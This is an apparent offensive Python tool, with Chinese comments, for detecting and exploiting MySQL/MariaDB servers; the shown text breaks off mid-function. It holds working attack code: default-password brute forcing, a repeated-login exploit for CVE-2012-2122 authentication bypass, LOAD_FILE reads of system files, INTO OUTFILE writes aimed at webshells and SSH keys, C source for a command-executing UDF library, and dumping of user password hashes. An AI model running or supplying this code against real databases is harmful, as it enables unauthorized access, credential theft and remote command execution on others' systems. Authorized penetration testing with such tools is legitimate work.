#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MySQL / MariaDB 综合漏洞检测/利用脚本 v1.0
覆盖 未授权访问 / 弱口令爆破 / UDF 命令执行 / 文件读写 / 认证绕过 /
     SQL 注入 Fuzzer / 信息泄露
仅用于授权安全测试 / 靶场验证

攻击模式:
  check    — 综合漏洞检测 (默认)
  rce      — UDF / INTO OUTFILE 命令执行
  sql      — 执行任意 SQL 查询
  shell    — 交互式利用 Shell
  sqli     — SQL 注入 Fuzzer (Web App 后端)

CVE 覆盖:
  CVE-2012-2122   — 认证绕过 (MySQL < 5.5.24, 重复尝试可绕过)
  CVE-2016-6662   — 权限提升 (mysql_safe / systemd)
  CVE-2016-6663   — 竞态条件权限提升
  CVE-2016-6664   — 符号链接 root 权限提升
  无 CVE          — 未授权访问 (root 空密码 / 弱口令)
  无 CVE          — UDF 共享库注入 RCE (CREATE FUNCTION + plugin_dir 写入)
  无 CVE          — LOAD_FILE 任意文件读取
  无 CVE          — SELECT INTO OUTFILE / DUMPFILE 任意文件写入
  无 CVE          — LOAD DATA LOCAL INFILE 客户端文件窃取
  无 CVE          — 弱口令爆破 (root / mysql / admin ...)

MySQL Wire Protocol 参考:
  - HandshakeV10 (protocol 10)
  - mysql_native_password (auth 插件)
  - caching_sha2_password (MySQL 8.0+)
"""

import socket
import struct
import sys
import argparse
import re
import random
import string
import hashlib
import time
import os
import urllib.parse
from typing import Optional, Tuple, List, Dict, Any

# ============== 依赖检查 ==============

try:
    import pymysql
    HAS_PYMYSQL = True
except ImportError:
    HAS_PYMYSQL = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(
                    enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     MySQL / MariaDB 综合漏洞检测/利用工具 v1.0                     ║
║     UDF RCE / 文件读写 / 认证绕过 / 弱口令 | 仅限授权安全使用    ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


# ============== MySQL Wire Protocol ==============

# Capability flags
CLIENT_LONG_PASSWORD = 1
CLIENT_FOUND_ROWS = 2
CLIENT_LONG_FLAG = 4
CLIENT_CONNECT_WITH_DB = 8
CLIENT_NO_SCHEMA = 0x10
CLIENT_COMPRESS = 0x20
CLIENT_ODBC = 0x40
CLIENT_LOCAL_FILES = 0x80
CLIENT_IGNORE_SPACE = 0x100
CLIENT_PROTOCOL_41 = 0x200
CLIENT_INTERACTIVE = 0x400
CLIENT_SSL = 0x800
CLIENT_IGNORE_SIGPIPE = 0x1000
CLIENT_TRANSACTIONS = 0x2000
CLIENT_RESERVED = 0x4000
CLIENT_SECURE_CONNECTION = 0x8000
CLIENT_MULTI_STATEMENTS = 0x10000
CLIENT_MULTI_RESULTS = 0x20000
CLIENT_PS_MULTI_RESULTS = 0x40000
CLIENT_PLUGIN_AUTH = 0x80000
CLIENT_CONNECT_ATTRS = 0x100000
CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA = 0x200000
CLIENT_CAN_HANDLE_EXPIRED_PASSWORDS = 0x400000
CLIENT_SESSION_TRACK = 0x800000
CLIENT_DEPRECATE_EOF = 0x1000000

# Max packet size
MAX_PACKET_SIZE = 0xFFFFFF

# Server status
SERVER_STATUS_IN_TRANS = 1
SERVER_STATUS_AUTOCOMMIT = 2

# Command types
COM_QUERY = 3
COM_PING = 14
COM_QUIT = 1

# Auth plugin names
AUTH_MYSQL_NATIVE_PASSWORD = 'mysql_native_password'
AUTH_CACHING_SHA2_PASSWORD = 'caching_sha2_password'
AUTH_MYSQL_OLD_PASSWORD = 'mysql_old_password'

# Default credentials for brute force
DEFAULT_CREDS = [
    ('root', ''),
    ('root', 'root'),
    ('root', 'toor'),
    ('root', 'password'),
    ('root', '123456'),
    ('root', 'admin'),
    ('root', 'mysql'),
    ('mysql', 'mysql'),
    ('admin', 'admin'),
    ('admin', '123456'),
    ('test', 'test'),
    ('dbadmin', 'dbadmin'),
]

# Common plugin dirs for UDF
PLUGIN_DIRS_LINUX = [
    '/usr/lib/mysql/plugin/',
    '/usr/lib64/mysql/plugin/',
    '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/',
    '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/',
    '/usr/local/mysql/lib/plugin/',
    '/var/lib/mysql/',
]

PLUGIN_DIRS_WIN = [
    'C:/Program Files/MySQL/MySQL Server 8.0/lib/plugin/',
    'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/',
    'C:/Program Files/MariaDB 10.6/lib/plugin/',
    'C:/xampp/mysql/lib/plugin/',
]


# ============== mysql_native_password ==============

def _mysql_native_password(password: str, salt: bytes) -> bytes:
    """SHA1(password) XOR SHA1(salt + SHA1(SHA1(password)))"""
    sha1_pass = hashlib.sha1(password.encode('utf-8')).digest()
    sha1_sha1 = hashlib.sha1(sha1_pass).digest()
    inner = hashlib.sha1(salt + sha1_sha1).digest()
    return bytes(a ^ b for a, b in zip(sha1_pass, inner))


def _caching_sha2_password(password: str, salt: bytes, full: bool = True) -> bytes:
    """
    caching_sha2_password auth (MySQL 8.0+ default)
    XOR(SHA256(password), SHA256(SHA256(password) + salt))
    简化实现 — 用于握手阶段的 fast_auth_success
    """
    if not full:
        return b'\x00'
    sha256_pass = hashlib.sha256(password.encode('utf-8')).digest()
    sha256_sha256 = hashlib.sha256(sha256_pass).digest()
    inner = hashlib.sha256(sha256_sha256 + salt).digest()
    return bytes(a ^ b for a, b in zip(sha256_pass, inner))


# ============== Packet 函数 ==============

def _read_packet(sock) -> bytes:
    """读取一个 MySQL 协议包"""
    header = b''
    while len(header) < 4:
        chunk = sock.recv(4 - len(header))
        if not chunk:
            raise ConnectionError('连接已关闭')
        header += chunk
    length = header[0] | (header[1] << 8) | (header[2] << 16)
    seq = header[3]
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError('连接包截断')
        data += chunk
    return data, seq


def _send_packet(sock, data: bytes, seq: int = 0):
    """发送一个 MySQL 协议包"""
    length = len(data)
    sock.sendall(struct.pack('<I', length)[:3] + bytes([seq]) + data)


def _lenenc_int(val: int) -> bytes:
    if val < 251:
        return bytes([val])
    elif val < 65536:
        return b'\xfc' + struct.pack('<H', val)
    elif val < 16777216:
        return b'\xfd' + struct.pack('<I', val)[:3]
    else:
        return b'\xfe' + struct.pack('<Q', val)


def _lenenc_str(s: bytes) -> bytes:
    return _lenenc_int(len(s)) + s


def _read_lenenc_int(data: bytes, offset: int) -> Tuple[int, int]:
    b = data[offset]
    if b < 251:
        return b, offset + 1
    elif b == 0xfc:
        return struct.unpack('<H', data[offset + 1:offset + 3])[0], offset + 3
    elif b == 0xfd:
        return struct.unpack('<I', data[offset + 1:offset + 4] + b'\x00')[0], offset + 4
    elif b == 0xfe:
        return struct.unpack('<Q', data[offset + 1:offset + 9])[0], offset + 9
    return 0, offset + 1


def _read_null_term(data: bytes, offset: int) -> Tuple[str, int]:
    end = data.find(b'\x00', offset)
    if end == -1:
        return data[offset:].decode('utf-8', errors='replace'), len(data)
    return data[offset:end].decode('utf-8', errors='replace'), end + 1


# ============== Raw MySQL 连接 ==============

class MySQLRawConnection:
    """MySQL Wire Protocol 原始连接"""

    def __init__(self, host: str, port: int = 3306, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._handshake: dict = {}
        self._authenticated = False
        self._seq = 0
        self._server_version = ''

    def connect(self, use_ssl: bool = False) -> bool:
        try:
            self.sock = socket.create_connection(
                (self.host, self.port), timeout=self.timeout)
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self._seq = 0
            return True
        except socket.timeout:
            safe_print(f"  {C.RED}[-] 连接超时{C.RST}")
            return False
        except ConnectionRefusedError:
            safe_print(f"  {C.RED}[-] 连接被拒绝{C.RST}")
            return False
        except Exception as e:
            safe_print(f"  {C.RED}[-] 连接失败: {e}{C.RST}")
            return False

    def read_handshake(self) -> dict:
        """读取服务端握手包"""
        data, seq = _read_packet(self.sock)
        self._seq = seq + 1

        info: dict = {}
        offset = 0

        protocol_version = data[offset]
        offset += 1
        info['protocol'] = protocol_version

        if protocol_version < 10:
            self._server_version, offset = _read_null_term(data, offset)
            thread_id = struct.unpack('<I', data[offset:offset + 4])[0]
            offset += 4
            salt = data[offset:offset + 8]
            offset += 8
            offset += 1  # filler
            info['thread_id'] = thread_id
            info['salt'] = salt
            info['auth_plugin'] = 'mysql_old_password'
            return info

        # HandshakeV10
        self._server_version, offset = _read_null_term(data, offset)
        info['server_version'] = self._server_version

        info['thread_id'] = struct.unpack('<I', data[offset:offset + 4])[0]
        offset += 4

        # auth_plugin_data_part1 (8 bytes)
        salt1 = data[offset:offset + 8]
        offset += 8
        offset += 1  # filler

        # capability_flags_1 (2 bytes)
        cap_lower = struct.unpack('<H', data[offset:offset + 2])[0]
        offset += 2

        charset = data[offset]
        offset += 1

        info['status'] = struct.unpack('<H', data[offset:offset + 2])[0]
        offset += 2

        # capability_flags_2 (2 bytes)
        cap_upper = struct.unpack('<H', data[offset:offset + 2])[0]
        offset += 2

        info['capabilities'] = cap_lower | (cap_upper << 16)
        info['charset'] = charset

        auth_plugin_data_len = data[offset]
        offset += 1

        offset += 10  # reserved

        # auth_plugin_data_part2
        if info['capabilities'] & CLIENT_SECURE_CONNECTION:
            salt2_len = max(13, auth_plugin_data_len - 8)
            salt2 = data[offset:offset + salt2_len]
            offset += salt2_len
            info['salt'] = salt1 + salt2

        # auth_plugin_name
        if info['capabilities'] & CLIENT_PLUGIN_AUTH:
            info['auth_plugin'], _ = _read_null_term(data, offset)

        return info

    def send_handshake_response(self, username: str, password: str,
                                database: str = 'mysql',
                                auth_plugin: str = '',
                                handshake: dict = None) -> bool:
        """发送握手响应包"""
        hs = handshake or self._handshake
        caps = hs['capabilities']
        salt = hs.get('salt', b'')

        our_caps = (
            CLIENT_PROTOCOL_41 |
            CLIENT_SECURE_CONNECTION |
            CLIENT_PLUGIN_AUTH |
            CLIENT_CONNECT_WITH_DB |
            CLIENT_TRANSACTIONS |
            CLIENT_MULTI_RESULTS |
            CLIENT_PS_MULTI_RESULTS |
            CLIENT_DEPRECATE_EOF |
            (CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA if caps & CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA else 0)
        )

        body = struct.pack('<I', our_caps)       # client capabilities
        body += struct.pack('<I', MAX_PACKET_SIZE)  # max packet size
        body += struct.pack('<B', 33)              # charset utf8mb4
        body += b'\x00' * 23                       # reserved
        body += username.encode() + b'\x00'        # username

        plugin = auth_plugin or hs.get('auth_plugin', AUTH_MYSQL_NATIVE_PASSWORD)

        # 计算 auth response
        if password:
            if plugin == AUTH_MYSQL_NATIVE_PASSWORD:
                auth_resp = _mysql_native_password(password, salt)
            elif plugin == AUTH_CACHING_SHA2_PASSWORD:
                auth_resp = _caching_sha2_password(password, salt)
            else:
                # 未知插件, 当作 mysql_native_password 尝试
                auth_resp = _mysql_native_password(password, salt)
        else:
            auth_resp = b''

        # auth response length + data
        body += _lenenc_str(auth_resp)

        # database
        body += database.encode() + b'\x00'

        # auth plugin name
        body += plugin.encode() + b'\x00'

        _send_packet(self.sock, body, self._seq)
        self._seq += 1

        # 读取响应
        data, seq = _read_packet(self.sock)
        self._seq = seq + 1

        if len(data) > 0:
            resp_type = data[0]
            if resp_type == 0x00:  # OK
                self._authenticated = True
                return True
            elif resp_type == 0xFF:  # Error
                err_code = struct.unpack('<H', data[1:3])[0]
                err_msg = data[3:].decode('utf-8', errors='replace')
                self._last_error = err_msg
                return False
            elif resp_type == 0xFE:  # Auth switch
                # 处理 auth switch request
                offset = 1
                if data[offset] == 0x00 or data[offset] == 0x01:
                    offset += 1
                new_plugin, offset = _read_null_term(data, offset)
                new_salt = data[offset:]

                if password and new_plugin == AUTH_CACHING_SHA2_PASSWORD:
                    auth_resp2 = _caching_sha2_password(password, new_salt)
                    _send_packet(self.sock, auth_resp2, self._seq)
                    self._seq += 1
                    data2, seq2 = _read_packet(self.sock)
                    self._seq = seq2 + 1
                    if data2[0] == 0x00:
                        self._authenticated = True
                        return True
                    elif data2[0] == 0x01 and len(data2) > 1 and data2[1] in (3, 4):
                        # More auth needed (SSL or RSA) — skip for now
                        self._last_error = 'caching_sha2 requires full auth (RSA/SSL)'
                        return False

                self._last_error = f'auth switch to {new_plugin} not handled'
                return False
            elif resp_type == 0x01 and len(data) > 1:
                # More data needed (caching_sha2 fast auth)
                _send_packet(self.sock, b'\x02', self._seq)
                self._seq += 1
                data2, seq2 = _read_packet(self.sock)
                self._seq = seq2 + 1
                if data2[0] == 0x00:
                    self._authenticated = True
                    return True

        return False

    def login(self, username: str, password: str, database: str = 'mysql') -> bool:
        """完整登录流程"""
        try:
            self._handshake = self.read_handshake()
            return self.send_handshake_response(username, password, database,
                                                handshake=self._handshake)
        except Exception as e:
            self._last_error = str(e)
            return False

    def query(self, sql: str) -> Tuple[List[dict], str]:
        """执行 SQL 查询"""
        if not self._authenticated:
            return [], 'Not authenticated'

        _send_packet(self.sock, bytes([COM_QUERY]) + sql.encode(),
                     self._seq)
        self._seq += 1

        return self._read_query_result()

    def _read_query_result(self) -> Tuple[List[dict], str]:
        rows = []
        columns = []
        status = ''

        # 第一包可能是: OK(0x00), ERR(0xFF), 或结果集列数
        data, seq = _read_packet(self.sock)
        self._seq = seq + 1

        if not data:
            return [], 'Empty response'

        resp_type = data[0]

        if resp_type == 0xFF:  # Error
            err = data[1:].decode('utf-8', errors='replace')
            return [], 'Error: ' + err

        if resp_type == 0x00:  # OK
            offset = 1
            affected, offset = _read_lenenc_int(data, offset)
            last_id, offset = _read_lenenc_int(data, offset)
            return [], f'OK ({affected} rows affected, last_id={last_id})'

        if resp_type == 0xFB:  # LOCAL INFILE request (handle specially)
            return [], 'LOCAL INFILE request'

        # 结果集 — 第一字节是列数
        num_cols = resp_type
        if num_cols >= 251:
            num_cols, _ = _read_lenenc_int(data, 0)

        # 读取列定义
        for _ in range(num_cols):
            col_data, col_seq = _read_packet(self.sock)
            self._seq = col_seq + 1
            col_def = self._parse_column_def(col_data)
            columns.append(col_def)

        # EOF (或 OK for DEPRECATE_EOF)
        eof_data, eof_seq = _read_packet(self.sock)
        self._seq = eof_seq + 1

        # 数据行
        while True:
            row_data, row_seq = _read_packet(self.sock)
            self._seq = row_seq + 1
            if row_data[0] == 0xFE:  # EOF
                break
            row = {}
            offset = 1  # skip length-encoded row prefix in some cases
            for i, col in enumerate(columns):
                if row_data[0] == 0x00:
                    # textual result set
                    if offset < len(row_data) and row_data[offset] != 0xFB:
                        pass
                    str_val, offset = self._read_result_cell(row_data, offset)
                    row[col['name']] = str_val
                else:
                    # Shouldn't happen for COM_QUERY
                    row[col['name']] = ''
            rows.append(row)

        return rows, 'OK'

    def _parse_column_def(self, data: bytes) -> dict:
        # 简化: 只提取列名
        offset = 4  # skip catalog, schema
        table, offset = _read_lenenc_int(data, offset)
        offset += table  # skip table name
        org_table, offset = _read_lenenc_int(data, offset)
        offset += org_table
        name_len, offset = _read_lenenc_int(data, offset)
        name = data[offset:offset + name_len].decode('utf-8', errors='replace')
        return {'name': name}

    def _read_result_cell(self, data: bytes, offset: int) -> Tuple[str, int]:
        if offset >= len(data):
            return '', offset
        b = data[offset]
        if b == 0xFB:  # NULL
            return 'NULL', offset + 1
        length, new_offset = _read_lenenc_int(data, offset)
        return data[new_offset:new_offset + length].decode('utf-8', errors='replace'), new_offset + length

    def close(self):
        if self.sock:
            try:
                if self._authenticated:
                    _send_packet(self.sock, bytes([COM_QUIT]), self._seq)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


# ============== pymysql 封装 ==============

class MySQLClient:
    """pymysql 封装客户端"""

    def __init__(self, host: str, port: int = 3306, username: str = 'root',
                 password: str = '', database: str = 'mysql', timeout: int = 10):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.database = database
        self.timeout = timeout
        self.conn = None
        self._server_version = ''

    def connect(self) -> bool:
        if not HAS_PYMYSQL:
            return False
        try:
            self.conn = pymysql.connect(
                host=self.host, port=self.port,
                user=self.username, password=self.password,
                database=self.database,
                connect_timeout=self.timeout,
                charset='utf8mb4',
            )
            self._server_version = self.conn.get_server_info() or ''
            return True
        except pymysql.err.OperationalError as e:
            err = str(e)
            if 'Access denied' in err:
                safe_print(f"  {C.YLW}[!] 认证失败: {err[:100]}{C.RST}")
            else:
                safe_print(f"  {C.RED}[-] 连接失败: {err[:120]}{C.RST}")
            return False
        except Exception as e:
            safe_print(f"  {C.RED}[-] 连接错误: {e}{C.RST}")
            return False

    def query(self, sql: str, params: tuple = None) -> Tuple[List[dict], str]:
        try:
            cur = self.conn.cursor(pymysql.cursors.DictCursor)
            cur.execute(sql, params)
            if cur.description:
                rows = cur.fetchall()
            else:
                rows = []
            status = f'{cur.rowcount} rows'
            cur.close()
            return rows, status
        except Exception as e:
            return [], str(e)

    def exec_raw(self, sql: str) -> Tuple[bool, str]:
        try:
            cur = self.conn.cursor()
            cur.execute(sql)
            cur.close()
            self.conn.commit()
            return True, f'{cur.rowcount} rows affected'
        except Exception as e:
            return False, str(e)

    def get_version(self) -> str:
        rows, _ = self.query("SELECT VERSION() AS v")
        if rows:
            return rows[0].get('v', self._server_version)
        return self._server_version

    def get_server_info(self) -> Dict[str, Any]:
        info = {}
        for var in ['version', 'basedir', 'datadir', 'plugin_dir',
                     'secure_file_priv', 'max_allowed_packet',
                     'have_ssl', 'ssl_ca', 'log_error', 'general_log_file',
                     'slow_query_log_file']:
            rows, _ = self.query(f"SELECT @@{var} AS val")
            if rows:
                info[var] = rows[0].get('val', '')
        return info

    def get_grants(self) -> List[str]:
        rows, _ = self.query("SHOW GRANTS")
        return [list(r.values())[0] for r in rows]

    def is_super_or_file(self) -> Tuple[bool, bool]:
        """检查是否有 SUPER 和 FILE 权限"""
        has_super = False
        has_file = False
        rows, _ = self.query("SHOW GRANTS")
        for r in rows:
            g = list(r.values())[0].upper() if r else ''
            if 'SUPER' in g or 'ALL PRIVILEGES' in g:
                has_super = True
            if 'FILE' in g or 'ALL PRIVILEGES' in g:
                has_file = True
        return has_super, has_file

    def list_databases(self) -> List[str]:
        rows, _ = self.query("SHOW DATABASES")
        return [list(r.values())[0] for r in rows
                if list(r.values())[0] not in
                ('information_schema', 'performance_schema', 'mysql', 'sys')]

    def list_tables(self, db: str) -> List[str]:
        rows, _ = self.query(f"SHOW TABLES FROM `{db}`")
        return [list(r.values())[0] for r in rows]

    def get_users(self) -> List[dict]:
        rows, _ = self.query(
            "SELECT User, Host, authentication_string, plugin "
            "FROM mysql.user")
        return rows

    def read_file(self, filepath: str) -> Tuple[bool, str]:
        """LOAD_FILE 读取文件"""
        try:
            rows, _ = self.query(
                "SELECT LOAD_FILE(%s) AS content", (filepath,))
            if rows and rows[0].get('content'):
                return True, rows[0]['content']
            return False, 'NULL (文件不存在或无权限)'
        except Exception as e:
            return False, str(e)

    def write_file(self, filepath: str, content: str) -> Tuple[bool, str]:
        """SELECT ... INTO OUTFILE 写入文件"""
        try:
            tmp = f'_outfile_{randstr(6)}'
            ok, _ = self.exec_raw(
                f"SELECT '{content}' INTO OUTFILE '{filepath}'")
            return ok, 'OK' if ok else _
        except Exception as e:
            return False, str(e)

    def get_plugin_dir(self) -> str:
        rows, _ = self.query("SELECT @@plugin_dir AS d")
        if rows:
            return rows[0].get('d', '')
        return ''

    def check_secure_file_priv(self) -> str:
        rows, _ = self.query("SELECT @@secure_file_priv AS p")
        if rows:
            val = rows[0].get('p', '')
            if val is None:
                return 'DISABLED (可任意路径)'
            elif val == '':
                return 'EMPTY (可任意路径)'
            else:
                return f'LIMITED ({val})'
        return 'unknown'

    def close(self):
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass


# ============== 0. 指纹检测 ==============

def detect_mysql(host: str, port: int = 3306, timeout: int = 10) -> Tuple[bool, dict]:
    safe_print(f"\n{C.YLW}[0] 指纹检测 — {host}:{port}{C.RST}")
    info: dict = {}

    my = MySQLRawConnection(host, port, timeout)
    if not my.connect():
        return False, info

    try:
        handshake = my.read_handshake()
        ver = handshake.get('server_version', 'unknown')
        auth_plugin = handshake.get('auth_plugin', 'unknown')
        caps = handshake.get('capabilities', 0)

        safe_print(f"  {C.GRN}[+] 确认 MySQL/MariaDB | 版本: {ver} | "
                   f"认证: {auth_plugin}{C.RST}")
        info.update(handshake)

        # SSL 能力
        if caps & CLIENT_SSL:
            safe_print(f"  {C.YLW}    SSL 支持: YES{C.RST}")
            info['ssl_supported'] = True

        # 判断是 MySQL 还是 MariaDB
        ver_lower = ver.lower()
        if 'mariadb' in ver_lower:
            safe_print(f"  {C.CYN}    类型: MariaDB{C.RST}")
        else:
            safe_print(f"  {C.CYN}    类型: MySQL{C.RST}")

        return True, info
    except Exception as e:
        safe_print(f"  {C.CYN}[-] 握手失败: {e}{C.RST}")
    finally:
        my.close()

    return False, info


# ============== 1. 认证检测 ==============

def check_auth(host: str, port: int, timeout: int = 10) -> Tuple[bool, dict]:
    safe_print(f"\n{C.YLW}[1] 认证检测{C.RST}")
    info: dict = {}

    # --- 方式 1: 无密码尝试 ---
    my = MySQLRawConnection(host, port, timeout)
    if my.connect():
        try:
            handshake = my.read_handshake()
            if my.send_handshake_response('root', '', 'mysql',
                                          handshake=handshake):
                safe_print(f"  {C.RED}[!] root 空密码登录成功!{C.RST}")
                info['unauthenticated'] = True
                info['username'] = 'root'
                info['password'] = ''
                my.close()
                return True, info
        except Exception:
            pass
        my.close()

    # --- 方式 2: CVE-2012-2122 认证绕过 (MySQL < 5.5.24) ---
    safe_print(f"  {C.CYN}[*] 尝试 CVE-2012-2122 认证绕过...{C.RST}")
    for attempt in range(15):
        try:
            my2 = MySQLRawConnection(host, port, timeout)
            if my2.connect():
                handshake = my2.read_handshake()
                if my2.send_handshake_response('root', 'wrong_password',
                                               'mysql', handshake=handshake):
                    safe_print(f"  {C.RED}[!] CVE-2012-2122 认证绕过成功! (第{attempt+1}次){C.RST}")
                    info['unauthenticated'] = True
                    info['cve_2012_2122'] = True
                    my2.close()
                    return True, info
                my2.close()
        except Exception:
            pass
    safe_print(f"  {C.CYN}    CVE-2012-2122 未命中 (已修复或非受影响版本){C.RST}")

    # --- 方式 3: 弱口令爆破 ---
    safe_print(f"\n  {C.YLW}[*] 弱口令爆破 ({len(DEFAULT_CREDS)} 组)...{C.RST}")

    for user, pwd in DEFAULT_CREDS:
        try:
            my3 = MySQLRawConnection(host, port, timeout)
            if not my3.connect():
                continue
            handshake = my3.read_handshake()
            if my3.send_handshake_response(user, pwd, 'mysql',
                                           handshake=handshake):
                safe_print(f"  {C.RED}[!] 有效凭据: {user}:{pwd}{C.RST}")
                info['authenticated'] = True
                info['username'] = user
                info['password'] = pwd
                my3.close()
                return True, info
            # 错误提示
            err = getattr(my3, '_last_error', '')
            if 'Access denied' in str(err) and user == 'root':
                safe_print(f"  {C.CYN}    {user}:{pwd if pwd else '(empty)'} — denied{C.RST}")
            my3.close()
        except Exception:
            continue

    # --- 方式 4: pymysql 再试一遍 ---
    if HAS_PYMYSQL:
        for user, pwd in DEFAULT_CREDS:
            c = MySQLClient(host, port, user, pwd, 'mysql', timeout)
            if c.connect():
                safe_print(f"  {C.RED}[!] 有效凭据 (pymysql): {user}:{pwd}{C.RST}")
                info['authenticated'] = True
                info['username'] = user
                info['password'] = pwd
                c.close()
                return True, info
            c.close()

    if not info:
        safe_print(f"  {C.CYN}[-] 弱口令未命中，需要提供凭据{C.RST}")
    return bool(info), info


# ============== 2. UDF 命令执行 ==============

def _generate_udf_so(command: str, os_type: str = 'linux') -> bytes:
    """
    生成 UDF 共享库。
    实际利用时需要编译 .so/.dll — 这里输出模板说明。
    """
    if os_type == 'linux':
        c_code = f'''#include <stdlib.h>
int sys_exec(const char *cmd) {{ return system(cmd); }}
int sys_eval(const char *cmd, char *out, int out_len) {{
    FILE *fp = popen(cmd, "r");
    if (!fp) return 0;
    int n = fread(out, 1, out_len - 1, fp);
    out[n] = '\\0';
    pclose(fp);
    return n;
}}'''
    else:
        c_code = f'''#include <stdlib.h>
__declspec(dllexport) int sys_exec(const char *cmd) {{ return system(cmd); }}
__declspec(dllexport) int sys_eval(const char *cmd, char *out, int out_len) {{
    FILE *fp = _popen(cmd, "r");
    if (!fp) return 0;
    int n = fread(out, 1, out_len - 1, fp);
    out[n] = '\\0';
    _pclose(fp);
    return n;
}}'''
    return c_code.encode()


def _hex_encode(data: bytes) -> str:
    return '0x' + data.hex()


def check_udf_rce(client: MySQLClient) -> Tuple[bool, List[str]]:
    """UDF 命令执行检测"""
    methods = []

    has_super, has_file = client.is_super_or_file()
    plugin_dir = client.get_plugin_dir()
    secure = client.check_secure_file_priv()

    safe_print(f"\n  {C.CYN}    SUPER: {'YES' if has_super else 'NO'} | "
               f"FILE: {'YES' if has_file else 'NO'}{C.RST}")
    safe_print(f"  {C.CYN}    plugin_dir: {plugin_dir}{C.RST}")
    safe_print(f"  {C.CYN}    secure_file_priv: {secure}{C.RST}")

    # 方式 1: INTO DUMPFILE 写 UDF .so → CREATE FUNCTION
    if has_super and plugin_dir:
        safe_print(f"  {C.RED}[!] SUPER + plugin_dir 可写 → UDF RCE 可用!{C.RST}")
        methods.append('UDF (INTO DUMPFILE + CREATE FUNCTION)')

    # 方式 2: INTO OUTFILE 写 webshell
    if has_file and 'DISABLED' in secure:
        safe_print(f"  {C.RED}[!] FILE 权限 + 无目录限制 → 可写入 WebShell / SSH key{C.RST}")
        methods.append('INTO OUTFILE (WebShell)')

    # 方式 3: LOAD_FILE 文件读取
    if has_file:
        safe_print(f"  {C.RED}[!] FILE 权限 → LOAD_FILE 可读任意文件{C.RST}")
        methods.append('LOAD_FILE 文件读取')

    # 方式 4: 基于 general_log / slow_query_log 写入
    if has_super:
        safe_print(f"  {C.RED}[!] SUPER → 可通过 general_log 写入 WebShell 至可写目录{C.RST}")
        methods.append('general_log 写入')

    if not methods:
        safe_print(f"  {C.CYN}    当前权限不支持文件/命令执行操作{C.RST}")
        safe_print(f"  {C.CYN}    提升到 FILE + SUPER 权限后可利用 UDF RCE{C.RST}")

    return bool(methods), methods


# ============== 3. 文件操作 ==============

def check_file_ops(host: str, port: int, username: str = 'root',
                   password: str = '', database: str = 'mysql',
                   timeout: int = 10) -> List[str]:
    safe_print(f"\n{C.YLW}[2] 文件操作能力 (LOAD_FILE / INTO OUTFILE){C.RST}")
    hits = []

    if not HAS_PYMYSQL:
        safe_print(f"  {C.YLW}[!] 需要 pymysql 库{C.RST}")
        return hits

    client = MySQLClient(host, port, username, password, database, timeout)
    if not client.connect():
        return hits

    # LOAD_FILE
    for f in ['/etc/passwd', '/etc/hostname',
              'C:\\Windows\\win.ini', 'C:\\boot.ini']:
        ok, content = client.read_file(f)
        if ok and content and len(content) > 5:
            safe_print(f"  {C.RED}[!] LOAD_FILE 可用 → {f}{C.RST}")
            safe_print(f"  {C.RED}    {content[:200].strip()}{C.RST}")
            hits.append(f'文件读取 ({f})')
            break

    # INTO OUTFILE
    rk = randstr(6)
    for outpath in ['/tmp/mysql_test_' + rk,
                    'C:\\Windows\\Temp\\mysql_test_' + rk]:
        ok, msg = client.write_file(outpath, 'MySQLSecurityTest')
        if ok:
            safe_print(f"  {C.RED}[!] INTO OUTFILE 可用 → {outpath}{C.RST}")
            hits.append(f'文件写入 ({outpath})')
            break

    # secure_file_priv
    secure = client.check_secure_file_priv()
    safe_print(f"  {C.YLW}    secure_file_priv: {secure}{C.RST}")
    if 'DISABLED' in secure or 'EMPTY' in secure:
        safe_print(f"  {C.RED}    [!!] 无目录限制 — 可写 WebShell / crontab / SSH key{C.RST}")

    client.close()
    return hits


# ============== 4. 信息泄露 ==============

def check_info_disclosure(host: str, port: int, username: str = 'root',
                          password: str = '', database: str = 'mysql',
                          timeout: int = 10) -> List[str]:
    safe_print(f"\n{C.YLW}[3] 信息泄露 / 安全审计{C.RST}")
    hits = []

    if not HAS_PYMYSQL:
        safe_print(f"  {C.YLW}[!] 需要 pymysql 库{C.RST}")
        return hits

    client = MySQLClient(host, port, username, password, database, timeout)
    if not client.connect():
        return hits

    ver = client.get_version()
    has_super, has_file = client.is_super_or_file()

    safe_print(f"  {C.YLW}    版本      : {ver}{C.RST}")
    safe_print(f"  {C.YLW}    SUPER     : {'YES' if has_super else 'NO'}{C.RST}")
    safe_print(f"  {C.YLW}    FILE      : {'YES' if has_file else 'NO'}{C.RST}")

    # 配置信息
    svr = client.get_server_info()
    for k in ['basedir', 'datadir', 'plugin_dir', 'secure_file_priv',
              'log_error', 'have_ssl']:
        if svr.get(k):
            safe_print(f"  {C.YLW}    {k}: {svr[k]}{C.RST}")

    # 数据库列表
    dbs = client.list_databases()
    safe_print(f"  {C.YLW}    用户数据库: {dbs[:10]}{'...' if len(dbs) > 10 else ''}{C.RST}")

    # 用户列表
    users = client.get_users()
    safe_print(f"  {C.YLW}    用户列表 ({len(users)}){C.RST}")
    for u in users:
        hash_preview = (u.get('authentication_string', '') or '')[:30]
